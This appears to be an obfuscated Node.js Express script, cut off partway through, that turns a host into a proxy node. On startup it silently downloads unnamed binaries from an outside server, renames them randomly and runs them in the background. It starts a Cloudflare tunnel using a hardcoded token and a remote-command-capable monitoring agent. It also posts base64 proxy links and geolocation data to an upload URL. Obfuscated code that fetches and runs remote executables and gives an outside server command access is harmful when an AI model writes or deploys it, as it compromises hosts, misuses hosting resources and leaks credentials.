const _0x2f8387=_0x185f;(function(_0x4779b2,_0x523f9d){const _0x4267af=_0x185f,_0x166fcf=_0x4779b2();while(!![]){try{const _0xd38d9f=-parseInt(_0x4267af(0x1fc))/0x1+-parseInt(_0x4267af(0x203))/0x2*(-parseInt(_0x4267af(0x14b))/0x3)+-parseInt(_0x4267af(0x1ce))/0x4*(parseInt(_0x4267af(0x1e0))/0x5)+parseInt(_0x4267af(0x1d9))/0x6+-parseInt(_0x4267af(0x1f6))/0x7*(parseInt(_0x4267af(0x193))/0x8)+parseInt(_0x4267af(0x209))/0x9*(parseInt(_0x4267af(0x156))/0xa)+-parseInt(_0x4267af(0x17c))/0xb*(parseInt(_0x4267af(0x1c6))/0xc);if(_0xd38d9f===_0x523f9d)break;else _0x166fcf['push'](_0x166fcf['shift']());}catch(_0x2d461a){_0x166fcf['push'](_0x166fcf['shift']());}}}(_0x31f5,0x8e5f1));const _0x3318c1=(function(){let _0x3a40fe=!![];return function(_0x22d36e,_0x24c84a){const _0x378860=_0x3a40fe?function(){const _0x4ff3d7=_0x185f;if(_0x24c84a){const _0x5d0ecd=_0x24c84a[_0x4ff3d7(0x208)](_0x22d36e,arguments);return _0x24c84a=null,_0x5d0ecd;}}:function(){};return _0x3a40fe=![],_0x378860;};}()),_0x3e4ef8=_0x3318c1(this,function(){const _0x1a4be0=_0x185f;return _0x3e4ef8[_0x1a4be0(0x1a1)]()[_0x1a4be0(0x177)](_0x1a4be0(0x15d))[_0x1a4be0(0x1a1)]()[_0x1a4be0(0x17d)](_0x3e4ef8)[_0x1a4be0(0x177)](_0x1a4be0(0x15d));});_0x3e4ef8();const _0xfacf60=(function(){let _0x3d5afd=!![];return function(_0x156d3a,_0x2a489e){const _0x336d8e=_0x3d5afd?function(){const _0x14a07d=_0x185f;if(_0x2a489e){const _0xa0beba=_0x2a489e[_0x14a07d(0x208)](_0x156d3a,arguments);return _0x2a489e=null,_0xa0beba;}}:function(){};return _0x3d5afd=![],_0x336d8e;};}()),_0x558185=_0xfacf60(this,function(){const _0x188b0b=_0x185f,_0x6707eb=function(){const _0x23a580=_0x185f;let _0x3856e0;try{_0x3856e0=Function(_0x23a580(0x1b2)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2a0b31){_0x3856e0=window;}return _0x3856e0;},_0x253ff8=_0x6707eb(),_0x5f5d54=_0x253ff8['console']=_0x253ff8[_0x188b0b(0x178)]||{},_0x3d0e0b=[_0x188b0b(0x1f7),_0x188b0b(0x149),_0x188b0b(0x1cb),_0x188b0b(0x15f),_0x188b0b(0x1ed),'table',_0x188b0b(0x1cf)];for(let _0x429dff=0x0;_0x429dff<_0x3d0e0b[_0x188b0b(0x199)];_0x429dff++){const _0x189e65=_0xfacf60['constructor'][_0x188b0b(0x16d)]['bind'](_0xfacf60),_0xdd9f49=_0x3d0e0b[_0x429dff],_0x3f10fe=_0x5f5d54[_0xdd9f49]||_0x189e65;_0x189e65[_0x188b0b(0x145)]=_0xfacf60[_0x188b0b(0x206)](_0xfacf60),_0x189e65[_0x188b0b(0x1a1)]=_0x3f10fe['toString'][_0x188b0b(0x206)](_0x3f10fe),_0x5f5d54[_0xdd9f49]=_0x189e65;}});_0x558185();const express=require('express'),app=express(),axios=require(_0x2f8387(0x1e9)),os=require('os'),fs=require('fs'),path=require(_0x2f8387(0x173)),{promisify}=require(_0x2f8387(0x186)),exec=promisify(require('child_process')[_0x2f8387(0x159)]),UPLOAD_URL=process['env'][_0x2f8387(0x201)]||'',PROJECT_URL=process[_0x2f8387(0x148)][_0x2f8387(0x216)]||'',AUTO_ACCESS=process[_0x2f8387(0x148)][_0x2f8387(0x185)]||![],FILE_PATH=process[_0x2f8387(0x148)][_0x2f8387(0x144)]||_0x2f8387(0x196),SUB_PATH=process[_0x2f8387(0x148)][_0x2f8387(0x1e3)]||_0x2f8387(0x1a8),PORT=process[_0x2f8387(0x148)]['SERVER_PORT']||process['env'][_0x2f8387(0x151)]||0xbb8,UUID=process[_0x2f8387(0x148)][_0x2f8387(0x1ee)]||_0x2f8387(0x14c),NEZHA_SERVER=process[_0x2f8387(0x148)][_0x2f8387(0x187)]||'',NEZHA_PORT=process[_0x2f8387(0x148)][_0x2f8387(0x155)]||'',NEZHA_KEY=process[_0x2f8387(0x148)][_0x2f8387(0x20d)]||'',ARGO_DOMAIN=process[_0x2f8387(0x148)][_0x2f8387(0x147)]||'galaxyb.qwen.ddns-ip.net',ARGO_AUTH=process[_0x2f8387(0x148)][_0x2f8387(0x213)]||'eyJhIjoiODg3ZDQ2ZWMyM2ZmMDE0OGM3ZjBhNWI1NTI0OGYzMzQiLCJ0IjoiYzZjNzc0MzctZTEyNy00MTg1LWFmMDgtN2UwZTU0NWMwNjM4IiwicyI6Ik5HRTRaVEZoWkRVdE5XTTROUzAwTm1Zd0xUZ3pPVEl0TURGak9XTXdOVFppWmpJMiJ9',ARGO_PORT=process[_0x2f8387(0x148)][_0x2f8387(0x1bd)]||0x1f41,CFIP=process[_0x2f8387(0x148)][_0x2f8387(0x1c4)]||_0x2f8387(0x152),CFPORT=process['env'][_0x2f8387(0x15c)]||0x1bb,NAME=process[_0x2f8387(0x148)][_0x2f8387(0x16c)]||_0x2f8387(0x184);!fs[_0x2f8387(0x1f3)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2f8387(0x1f7)](FILE_PATH+_0x2f8387(0x1e7))):console[_0x2f8387(0x1f7)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x329bc8=_0x2f8387,_0x29efd8=_0x329bc8(0x1fd);let _0x10a83a='';for(let _0xf45eb6=0x0;_0xf45eb6<0x6;_0xf45eb6++){_0x10a83a+=_0x29efd8['charAt'](Math['floor'](Math[_0x329bc8(0x162)]()*_0x29efd8['length']));}return _0x10a83a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2f8387(0x1a7)](FILE_PATH,npmName),phpPath=path[_0x2f8387(0x1a7)](FILE_PATH,phpName),webPath=path[_0x2f8387(0x1a7)](FILE_PATH,webName),botPath=path[_0x2f8387(0x1a7)](FILE_PATH,botName),subPath=path[_0x2f8387(0x1a7)](FILE_PATH,_0x2f8387(0x168)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x2f8387(0x1a7)](FILE_PATH,_0x2f8387(0x20b)),configPath=path[_0x2f8387(0x1a7)](FILE_PATH,_0x2f8387(0x20e));function deleteNodes(){const _0xe9893d=_0x2f8387;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2767fe;try{_0x2767fe=fs[_0xe9893d(0x1f4)](subPath,_0xe9893d(0x164));}catch{return null;}const _0x6b2cd8=Buffer[_0xe9893d(0x165)](_0x2767fe,_0xe9893d(0x1d2))['toString']('utf-8'),_0x2f0763=_0x6b2cd8[_0xe9893d(0x1da)]('\x0a')[_0xe9893d(0x20a)](_0x514eb8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xe9893d(0x16e)](_0x514eb8));if(_0x2f0763[_0xe9893d(0x199)]===0x0)return;return axios[_0xe9893d(0x1b9)](UPLOAD_URL+_0xe9893d(0x1d8),JSON[_0xe9893d(0x1ef)]({'nodes':_0x2f0763}),{'headers':{'Content-Type':'application/json'}})[_0xe9893d(0x1bc)](_0x1cc107=>{return null;}),null;}catch(_0x143218){return null;}}function cleanupOldFiles(){const _0x5ecd3f=_0x2f8387;try{const _0x1fc34e=fs[_0x5ecd3f(0x1d4)](FILE_PATH);_0x1fc34e['forEach'](_0xfdf31=>{const _0x828c84=_0x5ecd3f,_0x44a19a=path[_0x828c84(0x1a7)](FILE_PATH,_0xfdf31);try{const _0x44bf3e=fs['statSync'](_0x44a19a);_0x44bf3e[_0x828c84(0x19c)]()&&fs['unlinkSync'](_0x44a19a);}catch(_0x1195a7){}});}catch(_0x3f8763){}}async function generateConfig(){const _0x53c3b3=_0x2f8387,_0x12353e={'log':{'access':_0x53c3b3(0x1ba),'error':'/dev/null','loglevel':_0x53c3b3(0x190)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x53c3b3(0x1e6)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x53c3b3(0x15a),'dest':0xbba},{'path':_0x53c3b3(0x1fe),'dest':0xbbb},{'path':_0x53c3b3(0x20c),'dest':0xbbc}]},'streamSettings':{'network':_0x53c3b3(0x1e5)}},{'port':0xbb9,'listen':_0x53c3b3(0x1a6),'protocol':_0x53c3b3(0x1de),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x53c3b3(0x190)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x53c3b3(0x1de),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x53c3b3(0x190),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x53c3b3(0x18b),_0x53c3b3(0x1b4),_0x53c3b3(0x1b0)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x53c3b3(0x1a6),'protocol':_0x53c3b3(0x1c5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x53c3b3(0x1b4),_0x53c3b3(0x1b0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x53c3b3(0x1a6),'protocol':_0x53c3b3(0x212),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x53c3b3(0x190),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x53c3b3(0x1b4),_0x53c3b3(0x1b0)],'metadataOnly':![]}}],'dns':{'servers':[_0x53c3b3(0x1ca)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x53c3b3(0x17f)}]};fs[_0x53c3b3(0x17a)](path[_0x53c3b3(0x1a7)](FILE_PATH,_0x53c3b3(0x20e)),JSON['stringify'](_0x12353e,null,0x2));}function _0x31f5(){const _0x35b5f9=['del\x20/f\x20/q\x20','Error\x20executing\x20command:\x20','PROJECT_URL','response','FILE_PATH','__proto__','set','ARGO_DOMAIN','env','warn','2087','447DRnoOE','df4007ed-a7e7-48a9-8890-1a494c442b4f','arch','Download\x20','substring','TunnelSecret','PORT','cdns.doon.eu.org','https://arm64.ssss.nyc.mn/bot','Skipping\x20adding\x20automatic\x20access\x20task','NEZHA_PORT','7566690WexXEC','index.html','Error\x20downloading\x20files:','exec','/vless-argo','/api/add-nodes','CFPORT','(((.+)+)+)+$','\x20>/dev/null\x202>&1\x20&','error','send','org','random','\x20successfully','utf-8','from','https://ipapi.co/json','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','sub.txt','fileName','\x0a\x20\x20tunnel:\x20','unlinkSync','NAME','prototype','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/vmess-argo?ed=2560','2053','Empowerment\x20failed\x20for\x20','path','--tls','win32','tunnel.json','search','console','arm64','writeFileSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','11glSokR','constructor','&fp=firefox&type=ws&host=','block','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA\x20variable\x20is\x20empty,skip\x20running','ARGO_DOMAIN:','all','Galaxy','AUTO_ACCESS','util','NEZHA_SERVER','firefox','\x20is\x20running','ArgoDomain:','http','amd','charAt','rm\x20-rf\x20','push','none','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','application/json','40XcLveq','/sub.txt\x20saved\x20successfully','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','.tmp','countryCode','\x20failed:\x20','length','text/plain;\x20charset=utf-8','.exe\x20>\x20nul\x202>&1','isFile','stream','pkill\x20-f\x20\x22[','data','pipe','toString','unlink','status','8443','clear','127.0.0.1','join','sub','utf8','nohup\x20','true','/tunnel.yml\x20run','match','https://amd64.ssss.nyc.mn/v1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','quic','country_code','return\x20(function()\x20','has','tls','Error\x20reading\x20boot.log:','tunnel.yml','\x0a\x0avmess://','https://amd64.ssss.nyc.mn/bot','post','/dev/null','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','catch','ARGO_PORT','Add\x20automatic\x20access\x20task\x20faild:\x20','mkdirSync','http://ip-api.com/json','Empowerment\x20success\x20for\x20','\x0a\x0atrojan://','Nodes\x20uploaded\x20successfully','CFIP','vmess','5208348GEAMya','unshift','createWriteStream','php\x20running\x20error:\x20','https+local://8.8.8.8/dns-query','info','https://arm64.ssss.nyc.mn/v1','forEach','1180NfZNjW','trace','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/add-subscriptions','base64','\x20>/dev/null\x202>&1','readdirSync','2083','?security=tls&sni=','taskkill\x20/f\x20/im\x20','/api/delete-nodes','4496142sbMWfZ','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','basename','pop','vless','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','16410fBqRKZ','App\x20is\x20running','chmod','SUB_PATH','https://arm64.ssss.nyc.mn/web','tcp','xtls-rprx-vision','\x20is\x20created','automatic\x20access\x20task\x20added\x20successfully','axios','platform','listen','2096','exception','UUID','stringify','success','443','\x0a\x20\x20credentials-file:\x20','existsSync','readFileSync','promises','816207ESDyHL','log','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20in\x20startserver:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','get','85247loHSBQ','abcdefghijklmnopqrstuvwxyz','/vmess-argo','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','message','UPLOAD_URL','\x20>\x20nul\x202>&1','15404euVBWo','\x0avless://','https://amd64.ssss.nyc.mn/agent','bind','arm','apply','9LncseP','filter','boot.log','/trojan-argo','NEZHA_KEY','config.json','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','includes','\x20-c\x20','trojan','ARGO_AUTH'];_0x31f5=function(){return _0x35b5f9;};return _0x31f5();}function getSystemArchitecture(){const _0x59114e=_0x2f8387,_0x598abb=os[_0x59114e(0x14d)]();return _0x598abb==='arm'||_0x598abb===_0x59114e(0x179)||_0x598abb==='aarch64'?'arm':_0x59114e(0x18c);}function downloadFile(_0x57dc39,_0x2051f5,_0x16231c){const _0x7949e=_0x2f8387,_0x390d38=_0x57dc39;!fs[_0x7949e(0x1f3)](FILE_PATH)&&fs[_0x7949e(0x1bf)](FILE_PATH,{'recursive':!![]});const _0x5090e6=fs[_0x7949e(0x1c8)](_0x390d38);axios({'method':_0x7949e(0x1fb),'url':_0x2051f5,'responseType':_0x7949e(0x19d)})['then'](_0x513fd1=>{const _0x19539a=_0x7949e;_0x513fd1[_0x19539a(0x19f)][_0x19539a(0x1a0)](_0x5090e6),_0x5090e6['on']('finish',()=>{const _0x46ebfe=_0x19539a;_0x5090e6['close'](),console[_0x46ebfe(0x1f7)](_0x46ebfe(0x14e)+path[_0x46ebfe(0x1dc)](_0x390d38)+_0x46ebfe(0x163)),_0x16231c(null,_0x390d38);}),_0x5090e6['on']('error',_0x3dbb64=>{const _0x3a6a15=_0x19539a;fs[_0x3a6a15(0x1a2)](_0x390d38,()=>{});const _0xf3a5d0=_0x3a6a15(0x14e)+path[_0x3a6a15(0x1dc)](_0x390d38)+_0x3a6a15(0x198)+_0x3dbb64['message'];console[_0x3a6a15(0x15f)](_0xf3a5d0),_0x16231c(_0xf3a5d0);});})[_0x7949e(0x1bc)](_0xce0610=>{const _0x5be491=_0x7949e,_0x55a375='Download\x20'+path[_0x5be491(0x1dc)](_0x390d38)+_0x5be491(0x198)+_0xce0610['message'];console['error'](_0x55a375),_0x16231c(_0x55a375);});}async function downloadFilesAndRun(){const _0x207d4f=_0x2f8387,_0x464538=getSystemArchitecture(),_0x554579=getFilesForArchitecture(_0x464538);if(_0x554579[_0x207d4f(0x199)]===0x0){console[_0x207d4f(0x1f7)](_0x207d4f(0x17b));return;}const _0x2dfca8=_0x554579['map'](_0x3d9e45=>{return new Promise((_0x4ff79a,_0x2da4d7)=>{const _0xe9ba58=_0x185f;downloadFile(_0x3d9e45[_0xe9ba58(0x169)],_0x3d9e45['fileUrl'],(_0x53e7d6,_0x3210c4)=>{_0x53e7d6?_0x2da4d7(_0x53e7d6):_0x4ff79a(_0x3210c4);});});});try{await Promise[_0x207d4f(0x183)](_0x2dfca8);}catch(_0x447932){console[_0x207d4f(0x15f)](_0x207d4f(0x158),_0x447932);return;}function _0x2691ef(_0x3e490c){const _0x464d58=0x1fd;_0x3e490c['forEach'](_0x2ca73f=>{const _0x178872=_0x185f;fs['existsSync'](_0x2ca73f)&&fs[_0x178872(0x1e2)](_0x2ca73f,_0x464d58,_0x4aacfd=>{const _0x3e11c7=_0x178872;_0x4aacfd?console[_0x3e11c7(0x15f)](_0x3e11c7(0x172)+_0x2ca73f+':\x20'+_0x4aacfd):console[_0x3e11c7(0x1f7)](_0x3e11c7(0x1c1)+_0x2ca73f+':\x20'+_0x464d58[_0x3e11c7(0x1a1)](0x8));});});}const _0x39d947=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2691ef(_0x39d947);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x577eba=NEZHA_SERVER[_0x207d4f(0x210)](':')?NEZHA_SERVER[_0x207d4f(0x1da)](':')[_0x207d4f(0x1dd)]():'',_0x4fe16b=new Set(['443',_0x207d4f(0x1a4),_0x207d4f(0x1ec),_0x207d4f(0x14a),_0x207d4f(0x1d5),_0x207d4f(0x171)]),_0x4a3e21=_0x4fe16b[_0x207d4f(0x1b3)](_0x577eba)?_0x207d4f(0x1ab):'false',_0x51362c='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x207d4f(0x20f)+_0x4a3e21+_0x207d4f(0x1ff)+UUID;fs[_0x207d4f(0x17a)](path[_0x207d4f(0x1a7)](FILE_PATH,'config.yaml'),_0x51362c);const _0x194c5d=_0x207d4f(0x1aa)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x207d4f(0x1f8);try{await exec(_0x194c5d),console[_0x207d4f(0x1f7)](phpName+_0x207d4f(0x189)),await new Promise(_0x1be46e=>setTimeout(_0x1be46e,0x3e8));}catch(_0x4919b5){console[_0x207d4f(0x15f)](_0x207d4f(0x1c9)+_0x4919b5);}}else{let _0x4a7d9d='';const _0x1c2532=[_0x207d4f(0x1f1),_0x207d4f(0x1a4),'2096',_0x207d4f(0x14a),_0x207d4f(0x1d5),_0x207d4f(0x171)];_0x1c2532[_0x207d4f(0x210)](NEZHA_PORT)&&(_0x4a7d9d=_0x207d4f(0x174));const _0x4de106=_0x207d4f(0x1aa)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4a7d9d+_0x207d4f(0x1fa);try{await exec(_0x4de106),console[_0x207d4f(0x1f7)](npmName+_0x207d4f(0x189)),await new Promise(_0x45695a=>setTimeout(_0x45695a,0x3e8));}catch(_0x16394b){console[_0x207d4f(0x15f)]('npm\x20running\x20error:\x20'+_0x16394b);}}}else console[_0x207d4f(0x1f7)](_0x207d4f(0x181));const _0xe71bab=_0x207d4f(0x1aa)+webPath+_0x207d4f(0x211)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xe71bab),console[_0x207d4f(0x1f7)](webName+'\x20is\x20running'),await new Promise(_0x47ce2b=>setTimeout(_0x47ce2b,0x3e8));}catch(_0x4220d9){console['error']('web\x20running\x20error:\x20'+_0x4220d9);}if(fs[_0x207d4f(0x1f3)](botPath)){let _0x3cba38;if(ARGO_AUTH[_0x207d4f(0x1ad)](/^[A-Z0-9a-z=]{120,250}$/))_0x3cba38=_0x207d4f(0x1db)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3cba38=_0x207d4f(0x1bb)+FILE_PATH+_0x207d4f(0x1ac):_0x3cba38=_0x207d4f(0x16f)+FILE_PATH+_0x207d4f(0x1d0)+ARGO_PORT;try{await exec(_0x207d4f(0x1aa)+botPath+'\x20'+_0x3cba38+'\x20>/dev/null\x202>&1\x20&'),console[_0x207d4f(0x1f7)](botName+_0x207d4f(0x189)),await new Promise(_0x5bd746=>setTimeout(_0x5bd746,0x7d0));}catch(_0x538c94){console['error'](_0x207d4f(0x215)+_0x538c94);}}await new Promise(_0x468e1e=>setTimeout(_0x468e1e,0x1388));}function getFilesForArchitecture(_0x1e3cd8){const _0x265723=_0x2f8387;let _0x536fed;_0x1e3cd8===_0x265723(0x207)?_0x536fed=[{'fileName':webPath,'fileUrl':_0x265723(0x1e4)},{'fileName':botPath,'fileUrl':_0x265723(0x153)}]:_0x536fed=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x265723(0x1b8)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2112da=_0x1e3cd8===_0x265723(0x207)?'https://arm64.ssss.nyc.mn/agent':_0x265723(0x205);_0x536fed['unshift']({'fileName':npmPath,'fileUrl':_0x2112da});}else{const _0x4a91b8=_0x1e3cd8===_0x265723(0x207)?_0x265723(0x1cc):_0x265723(0x1ae);_0x536fed[_0x265723(0x1c7)]({'fileName':phpPath,'fileUrl':_0x4a91b8});}}return _0x536fed;}function argoType(){const _0x31363d=_0x2f8387;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x31363d(0x1af));return;}if(ARGO_AUTH[_0x31363d(0x210)](_0x31363d(0x150))){fs[_0x31363d(0x17a)](path[_0x31363d(0x1a7)](FILE_PATH,_0x31363d(0x176)),ARGO_AUTH);const _0x4c857b=_0x31363d(0x16a)+ARGO_AUTH[_0x31363d(0x1da)]('\x22')[0xb]+_0x31363d(0x1f2)+path[_0x31363d(0x1a7)](FILE_PATH,_0x31363d(0x176))+_0x31363d(0x195)+ARGO_DOMAIN+_0x31363d(0x1df)+ARGO_PORT+_0x31363d(0x191);fs['writeFileSync'](path[_0x31363d(0x1a7)](FILE_PATH,_0x31363d(0x1b6)),_0x4c857b);}else console[_0x31363d(0x1f7)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x4a1845=_0x2f8387;let _0x3d24ce;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3d24ce=ARGO_DOMAIN,console[_0x4a1845(0x1f7)](_0x4a1845(0x182),_0x3d24ce),await _0x5641a7(_0x3d24ce);else try{const _0x53964f=fs['readFileSync'](path[_0x4a1845(0x1a7)](FILE_PATH,_0x4a1845(0x20b)),_0x4a1845(0x164)),_0x29142a=_0x53964f[_0x4a1845(0x1da)]('\x0a'),_0x2623b6=[];_0x29142a[_0x4a1845(0x1cd)](_0x2f5bdc=>{const _0x1578a7=_0x4a1845,_0x25c01c=_0x2f5bdc[_0x1578a7(0x1ad)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x25c01c){const _0x1da781=_0x25c01c[0x1];_0x2623b6['push'](_0x1da781);}});if(_0x2623b6[_0x4a1845(0x199)]>0x0)_0x3d24ce=_0x2623b6[0x0],console[_0x4a1845(0x1f7)](_0x4a1845(0x18a),_0x3d24ce),await _0x5641a7(_0x3d24ce);else{console[_0x4a1845(0x1f7)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4a1845(0x16b)](path[_0x4a1845(0x1a7)](FILE_PATH,_0x4a1845(0x20b)));async function _0x75da3f(){const _0x178db1=_0x4a1845;try{process[_0x178db1(0x1ea)]===_0x178db1(0x175)?await exec(_0x178db1(0x1d7)+botName+_0x178db1(0x19b)):await exec(_0x178db1(0x19e)+botName[_0x178db1(0x18d)](0x0)+']'+botName[_0x178db1(0x14f)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x1340ea){}}_0x75da3f(),await new Promise(_0x479a2f=>setTimeout(_0x479a2f,0xbb8));const _0x110ec5=_0x4a1845(0x16f)+FILE_PATH+_0x4a1845(0x1d0)+ARGO_PORT;try{await exec(_0x4a1845(0x1aa)+botPath+'\x20'+_0x110ec5+_0x4a1845(0x15e)),console[_0x4a1845(0x1f7)](botName+_0x4a1845(0x189)),await new Promise(_0x3e454b=>setTimeout(_0x3e454b,0xbb8)),await extractDomains();}catch(_0x53f421){console[_0x4a1845(0x15f)]('Error\x20executing\x20command:\x20'+_0x53f421);}}}catch(_0x189c05){console[_0x4a1845(0x15f)](_0x4a1845(0x1b5),_0x189c05);}async function _0x5c8f0e(){const _0x1489cd=_0x4a1845;try{const _0x40075c=await axios['get'](_0x1489cd(0x166),{'timeout':0xbb8});if(_0x40075c[_0x1489cd(0x19f)]&&_0x40075c[_0x1489cd(0x19f)][_0x1489cd(0x1b1)]&&_0x40075c['data']['org'])return _0x40075c['data'][_0x1489cd(0x1b1)]+'_'+_0x40075c['data'][_0x1489cd(0x161)];}catch(_0x246301){try{const _0x19db55=await axios[_0x1489cd(0x1fb)](_0x1489cd(0x1c0),{'timeout':0xbb8});if(_0x19db55[_0x1489cd(0x19f)]&&_0x19db55['data'][_0x1489cd(0x1a3)]===_0x1489cd(0x1f0)&&_0x19db55[_0x1489cd(0x19f)][_0x1489cd(0x197)]&&_0x19db55['data'][_0x1489cd(0x161)])return _0x19db55[_0x1489cd(0x19f)][_0x1489cd(0x197)]+'_'+_0x19db55['data'][_0x1489cd(0x161)];}catch(_0x1bf74d){}}return'Unknown';}async function _0x5641a7(_0x78618a){const _0x40c9c2=await _0x5c8f0e(),_0x100c65=NAME?NAME+'-'+_0x40c9c2:_0x40c9c2;return new Promise(_0x6d6039=>{setTimeout(()=>{const _0x5c2551=_0x185f,_0x30db7c={'v':'2','ps':''+_0x100c65,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5c2551(0x190),'net':'ws','type':_0x5c2551(0x190),'host':_0x78618a,'path':_0x5c2551(0x170),'tls':_0x5c2551(0x1b4),'sni':_0x78618a,'alpn':'','fp':_0x5c2551(0x188)},_0x379c08=_0x5c2551(0x204)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x78618a+_0x5c2551(0x17e)+_0x78618a+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x100c65+_0x5c2551(0x1b7)+Buffer[_0x5c2551(0x165)](JSON[_0x5c2551(0x1ef)](_0x30db7c))['toString']('base64')+_0x5c2551(0x1c2)+UUID+'@'+CFIP+':'+CFPORT+_0x5c2551(0x1d6)+_0x78618a+_0x5c2551(0x17e)+_0x78618a+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x100c65+'\x0a\x20\x20\x20\x20';console[_0x5c2551(0x1f7)](Buffer[_0x5c2551(0x165)](_0x379c08)[_0x5c2551(0x1a1)](_0x5c2551(0x1d2))),fs[_0x5c2551(0x17a)](subPath,Buffer[_0x5c2551(0x165)](_0x379c08)['toString'](_0x5c2551(0x1d2))),console[_0x5c2551(0x1f7)](FILE_PATH+_0x5c2551(0x194)),uploadNodes(),app[_0x5c2551(0x1fb)]('/'+SUB_PATH,(_0x4d7ee4,_0x3d55b5)=>{const _0x2ebf25=_0x5c2551,_0x27a2ab=Buffer[_0x2ebf25(0x165)](_0x379c08)[_0x2ebf25(0x1a1)](_0x2ebf25(0x1d2));_0x3d55b5[_0x2ebf25(0x146)]('Content-Type',_0x2ebf25(0x19a)),_0x3d55b5[_0x2ebf25(0x160)](_0x27a2ab);}),_0x6d6039(_0x379c08);},0x7d0);});}}function _0x185f(_0x166866,_0x2f371c){_0x166866=_0x166866-0x143;const _0x29f694=_0x31f5();let _0x558185=_0x29f694[_0x166866];return _0x558185;}async function uploadNodes(){const _0xbe532b=_0x2f8387;if(UPLOAD_URL&&PROJECT_URL){const _0x1aa197=PROJECT_URL+'/'+SUB_PATH,_0x2142a6={'subscription':[_0x1aa197]};try{const _0x5dbfa5=await axios['post'](UPLOAD_URL+_0xbe532b(0x1d1),_0x2142a6,{'headers':{'Content-Type':_0xbe532b(0x192)}});return _0x5dbfa5&&_0x5dbfa5[_0xbe532b(0x1a3)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x5dbfa5):null;}catch(_0x418c28){if(_0x418c28[_0xbe532b(0x143)]){if(_0x418c28['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xbe532b(0x1f3)](listPath))return;const 